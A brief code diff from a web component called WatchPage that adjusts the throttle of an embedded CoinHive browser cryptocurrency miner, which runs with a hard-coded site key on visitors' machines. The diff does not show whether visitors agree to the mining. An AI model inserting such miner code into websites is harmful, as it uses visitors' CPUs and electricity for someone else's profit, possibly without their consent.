@@ -38,7 +38,7 @@ class WatchPage extends Component {
         });
       });
       try {
-        this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.5});
+        this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.8});
       } catch(err) {
         this.setState({mine: false});
       }
